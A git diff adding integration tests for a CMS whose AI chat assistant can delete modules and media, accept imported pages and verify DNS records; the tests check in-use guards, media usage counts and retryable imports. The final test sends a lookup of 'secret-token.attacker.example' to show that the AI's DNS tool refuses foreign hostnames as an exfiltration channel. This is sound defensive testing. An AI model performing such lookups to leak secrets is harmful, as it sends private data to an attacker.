@@ -188,6 +188,106 @@ describe("delete_modules_many — branched delete + AI in-use guard", () => {
     expect((merged as unknown as { deleted_at: Date | null }[])[0]?.deleted_at).not.toBeNull();
   });
 
+  it("an already-staged unplacement does not hide a placement made live since", async () => {
+    const moduleId = await seedModule(`${P}-restaged`);
+    const page = await ok<{ pageId: string }>("pages.create", {
+      slug: `${P}-restaged-page`,
+      title: "Restaged",
+      templateId,
+    });
+    await ok("pages.set_modules", {
+      pageId: page.pageId,
+      blocks: [{ blockName: "content", moduleIds: [moduleId] }],
+    });
+    const { ai, chatSessionId } = await openChat("restaged");
+    const unplaced = await dispatch(
+      "remove_module_from",
+      { target: "page", targetRef: `${P}-restaged-page`, moduleId },
+      ai,
+    );
+    expect(unplaced.ok).toBe(true);
+    // Stage consumes the branch (stamps last_staged_at) …
+    await ok("chat.merge_to_main", { chatSessionId });
+    // … then the module is placed again on main (another chat / the panel).
+    await ok("pages.set_modules", {
+      pageId: page.pageId,
+      blocks: [{ blockName: "content", moduleIds: [moduleId] }],
+    });
+    const refused = await dispatch("delete_modules_many", { moduleIds: [moduleId] }, ai);
+    expect(refused.ok).toBe(false);
+    expect(refused.content).toContain(`${P}-restaged-page`);
+  });
+
+  it("treats a module nested in another module's content as placed", async () => {
+    const parentId = await seedModule(`${P}-parent`);
+    const childId = await seedModule(`${P}-child`);
+    await sqlAdmin(
+      (tx) => tx`
+        INSERT INTO content_instances (module_id, "values")
+        VALUES (${parentId}::uuid, ${JSON.stringify({ items: [{ moduleId: childId, contentInstanceId: null }] })}::jsonb)`,
+    );
+    const { ai } = await openChat("nested");
+    const refused = await dispatch("delete_modules_many", { moduleIds: [childId] }, ai);
+    expect(refused.ok).toBe(false);
+    expect(refused.content).toContain(`${P}-parent`);
+    expect(refused.content).toContain("nested");
+  });
+
+  it("publishing a branched delete drops the module's media usage", async () => {
+    const asset = await ok<{ assetId: string; slug: string }>("media.upload", {
+      sha256: "c".repeat(64),
+      originalName: `${P}-counted.png`,
+      name: `${P} counted`,
+      mime: "image/png",
+      sizeBytes: 10,
+      width: 1,
+      height: 1,
+      storageKey: `${P}/counted`,
+      variants: [
+        {
+          variant: "original",
+          format: "png",
+          width: 1,
+          height: 1,
+          sizeBytes: 10,
+          storageKey: `${P}/counted`,
+        },
+      ],
+    });
+    const usage = async () =>
+      (
+        (await sqlAdmin(
+          (tx) => tx`SELECT usage_count FROM media_assets WHERE id = ${asset.assetId}::uuid`,
+        )) as unknown as { usage_count: number }[]
+      )[0]?.usage_count;
+    const embedded = await seedModule(
+      `${P}-counted-a`,
+      `<img src="/_caelo/media/${asset.slug}/w800.webp" alt="">`,
+    );
+    const plain = await seedModule(`${P}-counted-b`);
+    expect(Number(await usage())).toBe(1);
+
+    const { ai, chatSessionId } = await openChat("usage");
+    // Branched: delete the embedding module, embed the asset in another.
+    const del = await dispatch("delete_modules_many", { moduleIds: [embedded] }, ai);
+    expect(del.ok).toBe(true);
+    await ok(
+      "modules.update",
+      { moduleId: plain, html: `<img src="/_caelo/media/${asset.slug}/w400.webp" alt="">` },
+      ai,
+    );
+    expect(Number(await usage())).toBe(1); // nothing live changed yet
+    await ok("chat.merge_to_main", { chatSessionId });
+    // -1 for the deleted module, +1 for the merged edit.
+    expect(Number(await usage())).toBe(1);
+
+    const { ai: ai2, chatSessionId: s2 } = await openChat("usage-2");
+    const del2 = await dispatch("delete_modules_many", { moduleIds: [plain] }, ai2);
+    expect(del2.ok).toBe(true);
+    await ok("chat.merge_to_main", { chatSessionId: s2 });
+    expect(Number(await usage())).toBe(0);
+  });
+
   it("a human (panel) delete keeps the direct, unguarded path", async () => {
     const moduleId = await seedModule(`${P}-panel`);
     await ok("modules.delete", { moduleId });
@@ -245,6 +345,56 @@ describe("delete_media_many — in-use guard sees this chat's unpublished edits"
     );
     expect(byId.get(used.assetId)?.deleted_at).toBeNull();
     expect(byId.get(unused.assetId)?.deleted_at).not.toBeNull();
+  });
+
+  it("matches slugs exactly and counts content-instance image values as uses", async () => {
+    const upload = (name: string, sha: string) =>
+      ok<{ assetId: string; slug: string }>("media.upload", {
+        sha256: sha,
+        originalName: `${P}-${name}.png`,
+        name: `${P} ${name}`,
+        mime: "image/png",
+        sizeBytes: 10,
+        width: 1,
+        height: 1,
+        storageKey: `${P}/${name}`,
+        variants: [
+          {
+            variant: "original",
+            format: "png",
+            width: 1,
+            height: 1,
+            sizeBytes: 10,
+            storageKey: `${P}/${name}`,
+          },
+        ],
+      });
+    const short = await upload("logo", "d".repeat(64));
+    const long = await upload("logo-dark", "e".repeat(64));
+    const field = await upload("field", "f".repeat(64));
+    const moduleId = await seedModule(`${P}-prefix`);
+    await sqlAdmin(
+      (tx) => tx`
+        INSERT INTO content_instances (module_id, "values")
+        VALUES (${moduleId}::uuid, ${JSON.stringify({ image: `/_caelo/media/${field.slug}/w800.webp` })}::jsonb)`,
+    );
+    const { ai } = await openChat("media-exact");
+    // Branched embed of the LONGER slug only.
+    await ok(
+      "modules.update",
+      { moduleId, html: `<img src="/_caelo/media/${long.slug}/w800.webp" alt="">` },
+      ai,
+    );
+    const r = await dispatch("delete_media_many", { assetIds: [short.assetId, field.assetId] }, ai);
+    expect(r.content).toContain("Deleted 1 of 2");
+    expect(r.content).toContain(`${field.assetId}: still used by ${P}-prefix`);
+    const rows = (await sqlAdmin(
+      (tx) =>
+        tx`SELECT id::text AS id, deleted_at FROM media_assets WHERE id IN (${short.assetId}::uuid, ${field.assetId}::uuid)`,
+    )) as unknown as { id: string; deleted_at: Date | null }[];
+    const byId = new Map(rows.map((x) => [x.id, x]));
+    expect(byId.get(short.assetId)?.deleted_at).not.toBeNull();
+    expect(byId.get(field.assetId)?.deleted_at).toBeNull();
   });
 });
 
@@ -317,6 +467,22 @@ describe("accept_import_pages — branch-scoped, snapshotted verbatim import", (
     const twice = await dispatch("accept_import_pages", { importPageIds: [importPageId] }, ai);
     expect(twice.ok).toBe(false);
     expect(twice.content).toContain("already accepted");
+
+    // A discarded chat soft-deletes its branch-created page but keeps the
+    // pointer — the acceptance must be retryable, not stuck "accepted".
+    await sqlAdmin((tx) => tx`UPDATE pages SET deleted_at = now() WHERE id = ${pageId}::uuid`);
+    const { ai: retryAi } = await openChat("accept-retry");
+    const retry = await dispatch(
+      "accept_import_pages",
+      { importPageIds: [importPageId], templateId },
+      retryAi,
+    );
+    expect(retry.ok).toBe(true);
+    const relinked = (await sqlAdmin(
+      (tx) =>
+        tx`SELECT accepted_page_id::text AS p FROM import_pages WHERE id = ${importPageId}::uuid`,
+    )) as unknown as { p: string | null }[];
+    expect(relinked[0]?.p).not.toBe(pageId);
   });
 
   it("cleanup_import_run is queued for the AI and applied for the approving Owner", async () => {
@@ -415,6 +581,29 @@ describe("verify_domains / verify_dns_records", () => {
     );
     expect(denied.ok).toBe(false);
     expect(denied.content).toContain("denylist");
+  });
+
+  it("limits explicit AI lookups to site-owned hostnames (no DNS exfil channel)", async () => {
+    await ok("domains.add", { hostname: `${P}-owned.invalid`, kind: "public" });
+    const { ai } = await openChat("dns-owned");
+    const foreign = await dispatch(
+      "verify_dns_records",
+      { records: [{ hostname: "secret-token.attacker.example", type: "TXT", expectedValue: "x" }] },
+      ai,
+    );
+    expect(foreign.ok).toBe(false);
+    expect(foreign.content).toContain("not one of this site's domains");
+    // A subdomain of a registered domain (e.g. an ACME challenge) is the site's own.
+    const own = await dispatch(
+      "verify_dns_records",
+      {
+        records: [
+          { hostname: `_acme-challenge.${P}-owned.invalid`, type: "TXT", expectedValue: "x" },
+        ],
+      },
+      ai,
+    );
+    expect(own.content).toContain(`TXT _acme-challenge.${P}-owned.invalid: pending`);
   });
 });
 
